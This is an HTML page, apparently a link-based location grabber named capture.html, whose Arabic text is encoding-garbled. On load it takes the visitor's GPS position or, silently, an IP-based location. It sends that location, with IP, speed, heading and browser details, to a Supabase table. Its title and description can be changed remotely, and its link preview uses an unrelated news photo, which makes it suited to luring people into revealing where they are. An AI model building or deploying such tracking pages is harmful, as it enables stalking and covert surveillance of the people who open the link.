<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width,initial-scale=1" />
  <title>Ù…Ø´Ø§Ø±ÙƒØ© Ù…ÙˆÙ‚Ø¹ÙŠ</title>

  <!-- OG Ø«Ø§Ø¨ØªØ© (Ù„Ù„Ù„Ù…Ø¹Ø§ÙŠÙ†Ø©). ÙŠÙ…ÙƒÙ† ÙˆØ¶Ø¹ ØµÙˆØ±Ø© Ø¹Ø§Ù…Ø© Ù„Ù„Ù…Ø´Ø±ÙˆØ¹ -->
  <meta property="og:title" content="Ø´Ø§Ø±Ùƒ Ù…ÙˆÙ‚Ø¹Ùƒ Ø§Ù„Ø¢Ù† ğŸ“" />
  <meta property="og:description" content="Ù‚Ø¯ ÙŠØ®ØªÙ„Ù Ø§Ù„Ø³Ù„ÙˆÙƒ Ø­Ø³Ø¨ Ø§Ù„Ø¥Ø¹Ø¯Ø§Ø¯Ø§Øª Ø§Ù„Ù…Ø±ÙÙ‚Ø©." />
  <meta property="og:image" content="https://img.youm7.com/large/201704190111181118.jpg" />
  <meta property="og:url" content="https://xb7rbx.github.io/X/capture.html" />
  <meta property="og:type" content="website" />
  <meta name="twitter:card" content="summary_large_image" />

  <meta http-equiv="Content-Security-Policy"
        content="default-src 'self'; img-src * data:; script-src 'self' https://cdn.jsdelivr.net https://unpkg.com; connect-src 'self' https://*.supabase.co https://ipwho.is; style-src 'self' 'unsafe-inline'; frame-ancestors 'none'; upgrade-insecure-requests">

  <style>
    body{font-family:system-ui,-apple-system,Segoe UI;min-height:100svh;display:grid;place-items:center;padding:24px;line-height:1.7;background:#fafafa}
    .card{max-width:560px;width:100%;border:1px solid #e5e7eb;border-radius:12px;padding:22px;background:#fff;box-shadow:0 6px 20px rgba(0,0,0,.06)}
    .muted{color:#6b7280}.ok{color:#047857;font-weight:700}.err{color:#b91c1c;font-weight:700}
    progress{width:100%}.hidden{display:none}
  </style>
</head>
<body>
  <div class="card">
    <h1 id="title">ğŸ“ ØªØ­Ø¯ÙŠØ¯ Ù…ÙˆÙ‚Ø¹Ùƒâ€¦</h1>
    <p id="desc" class="muted">Ø³Ù†Ø­Ø§ÙˆÙ„ GPS ÙˆØ¥Ù† Ø±ÙÙØ¶ Ø§Ù„Ø¥Ø°Ù† Ù†Ø³ØªØ®Ø¯Ù… IP.</p>
    <progress id="bar" max="100" value="10"></progress>
    <p id="status" class="muted">Ø¬Ø§Ø±Ù Ø§Ù„ØªØ­Ø¶ÙŠØ±â€¦</p>
    <button id="retry" class="hidden">Ø¥Ø¹Ø§Ø¯Ø© Ø§Ù„Ù…Ø­Ø§ÙˆÙ„Ø©</button>
  </div>

  <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
  <script>
    // Supabase
    const PROJECT_URL = 'https://weaiftikalbujuecfuhf.supabase.co';
    const ANON_KEY    = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6IndlYWlmdGlrYWxidWp1ZWNmdWhmIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NTYzOTU2MzAsImV4cCI6MjA3MTk3MTYzMH0.kxiytsgnkEOim_zUD49zgVp7rxr3nHAVHFb0Jq9dijk';
    const TABLE_PINGS = 'pings';
    const TABLE_CFG   = 'configs';
    const supabase = window.supabase.createClient(PROJECT_URL, ANON_KEY);

    // Ø¹Ù†Ø§ØµØ±
    const hTitle = document.getElementById('title');
    const pDesc  = document.getElementById('desc');
    const bar = document.getElementById('bar');
    const statusEl = document.getElementById('status');
    const retryBtn = document.getElementById('retry');

    // Ù‚Ø±Ø§Ø¡Ø© cfg Ù…Ù† Ø§Ù„Ø±Ø§Ø¨Ø·
    const qs = new URLSearchParams(location.search);
    const cfgId = qs.get('cfg') || null;

    // sanitize note Ù…Ù† Ø§Ù„Ø±Ø§Ø¨Ø· + fixed_note Ù…Ù† Ø§Ù„Ø¥Ø¹Ø¯Ø§Ø¯Ø§Øª
    function sanitizeNote(s){
      if (s == null) return null;
      s = s.slice(0, 120);
      const ok = /^[\u0600-\u06FF\w\s\-_.@#]+$/u;
      return ok.test(s) ? s : null;
    }
    const noteFromQS = sanitizeNote(qs.get('note'));

    function setStatus(t, cls){ statusEl.textContent = t; statusEl.className = cls || 'muted'; }

    // IP fallback â€” ipwho.is
    async function ipGeo(){
      const r = await fetch('https://ipwho.is/', { cache:'no-store' });
      if (!r.ok) throw new Error('IP request failed');
      const j = await r.json();
      if (!j.success) throw new Error('IP geolocation failed');
      return { lat:j.latitude ?? null, lng:j.longitude ?? null, ip:j.ip ?? null, accuracy:5000, method:'ip' };
    }

    // GPS
    function gpsGeo(timeoutMs = 15000){
      return new Promise((resolve,reject)=>{
        if (!('geolocation' in navigator)) return reject(new Error('Geolocation unsupported'));
        const opts = { enableHighAccuracy:true, timeout:timeoutMs, maximumAge:0 };
        navigator.geolocation.getCurrentPosition(
          pos => {
            const c = pos.coords;
            resolve({
              lat:c.latitude, lng:c.longitude,
              accuracy:c.accuracy ?? null,
              speed:c.speed ?? null, heading:c.heading ?? null,
              method:'gps'
            });
          },
          err => reject(err),
          opts
        );
      });
    }

    async function savePing(row){
      const { error } = await supabase.from(TABLE_PINGS).insert([row]);
      if (error) throw error;
    }

    async function fetchConfig(id){
      if (!id) return null;
      const { data, error } = await supabase.from(TABLE_CFG).select('*').eq('id', id).single();
      if (error) return null;
      return data;
    }

    async function start(){
      try{
        bar.value = 20; setStatus('ØªØ­Ù…ÙŠÙ„ Ø§Ù„Ø¥Ø¹Ø¯Ø§Ø¯Ø§Øªâ€¦');

        // Ø¬Ù„Ø¨ Ø§Ù„Ø¥Ø¹Ø¯Ø§Ø¯Ø§Øª ÙˆØªØ·Ø¨ÙŠÙ‚ Ø§Ù„Ù†ØµÙˆØµ
        const cfg = await fetchConfig(cfgId);
        if (cfg) {
          if (cfg.title) hTitle.textContent = cfg.title;
          if (cfg.description) pDesc.textContent = cfg.description;
        }

        const fixed_note = cfg?.fixed_note || null;
        const require_gps = !!cfg?.require_gps;
        const allow_ip_fallback = cfg?.allow_ip_fallback !== false; // Ø§ÙØªØ±Ø§Ø¶ÙŠ true
        const redirect_path = cfg?.redirect_path || null;

        const ua = navigator.userAgent;
        let result = null;

        // Ù…Ù†Ø·Ù‚ Ø§Ù„Ø§Ù„ØªÙ‚Ø§Ø·
        if (require_gps) {
          setStatus('Ù…Ø­Ø§ÙˆÙ„Ø© GPS Ø¨Ø¯Ù‚Ø© Ø¹Ø§Ù„ÙŠØ©â€¦'); bar.value = 40;
          result = await gpsGeo(15000);
        } else {
          // Ù†Ø­Ø§ÙˆÙ„ GPS Ø£ÙˆÙ„Ø§Ù‹ØŒ ÙˆØ¥Ù† ÙØ´Ù„ Ù†Ø±Ø¬Ø¹ IP Ø¥Ù† Ù…Ø³Ù…ÙˆØ­
          try {
            setStatus('Ù…Ø­Ø§ÙˆÙ„Ø© GPS Ø¨Ø¯Ù‚Ø© Ø¹Ø§Ù„ÙŠØ©â€¦'); bar.value = 40;
            result = await gpsGeo(15000);
          } catch {
            if (!allow_ip_fallback) throw new Error('ØªÙ… Ø±ÙØ¶ GPS ÙˆIP fallback ØºÙŠØ± Ù…Ø³Ù…ÙˆØ­');
            setStatus('ØªØ¹Ø°Ù‘Ø± GPSØŒ Ù†Ø³ØªØ®Ø¯Ù… IP ØªÙ‚Ø±ÙŠØ¨ÙŠâ€¦'); bar.value = 70;
            result = await ipGeo();
          }
        }

        // Ø§Ø­ØµÙ„ IP Ø¥Ù† Ù…Ø§ Ø¬Ø§Ø´ Ù…Ù† GPS
        let ip = result.ip || null;
        if (!ip) {
          try {
            const rr = await fetch('https://ipwho.is/', {cache:'no-store'});
            const jj = await rr.json();
            if (jj && jj.ip) ip = jj.ip;
          } catch {}
        }

        // ØµÙØº Ø§Ù„Ù…Ù„Ø§Ø­Ø¸Ø© Ø§Ù„Ù†Ù‡Ø§Ø¦ÙŠØ©
        let finalNote = fixed_note || noteFromQS || null;

        await savePing({
          lat: result.lat, lng: result.lng, accuracy: result.accuracy,
          ip, ua, note: finalNote,
          speed: result.speed ?? null, heading: result.heading ?? null,
          device_info: ua
        });

        bar.value = 100;
        setStatus(result.method === 'gps' ? 'ØªÙ… Ø§Ù„Ø­ÙØ¸ Ø¨Ø¯Ù‚Ø© GPS âœ…' : 'ØªÙ… Ø§Ù„Ø­ÙØ¸ (ØªÙ‚Ø±ÙŠØ¨ÙŠ Ø¹Ø¨Ø± IP) âœ…', 'ok');

        // ØªØ·Ø¨ÙŠÙ‚ redirect Ù…Ù† Ø§Ù„Ø¥Ø¹Ø¯Ø§Ø¯Ø§Øª ÙÙ‚Ø· Ù„Ù…Ø³Ø§Ø±Ø§Øª Ø¯Ø§Ø®Ù„ÙŠØ©
        if (redirect_path && redirect_path.startsWith('/') && !redirect_path.startsWith('//')) {
          setTimeout(()=>location.assign(redirect_path), 800);
        }
      } catch(e){
        setStatus('Ø®Ø·Ø£: '+e.message, 'err');
        retryBtn.classList.remove('hidden');
      }
    }

    document.getElementById('retry').addEventListener('click', ()=>{
      retryBtn.classList.add('hidden');
      setStatus('Ø¥Ø¹Ø§Ø¯Ø© Ø§Ù„Ù…Ø­Ø§ÙˆÙ„Ø©â€¦'); bar.value = 10;
      start();
    });

    start();
  </script>
</body>
</html>
